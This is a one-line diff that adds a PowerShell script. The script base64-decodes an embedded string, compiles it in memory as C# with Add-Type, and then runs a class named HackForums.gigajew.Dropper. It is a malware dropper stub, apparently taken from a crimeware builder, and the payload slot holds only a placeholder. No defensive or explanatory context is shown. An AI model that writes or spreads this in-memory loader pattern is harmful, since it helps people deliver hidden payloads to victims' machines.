@@ -1,0 +1,1 @@
+﻿$whatever = "powershell-data";$dec = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($whatever));Add-Type -TypeDefinition $dec;$instance = New-Object HackForums.gigajew.Dropper;$instance.Run();
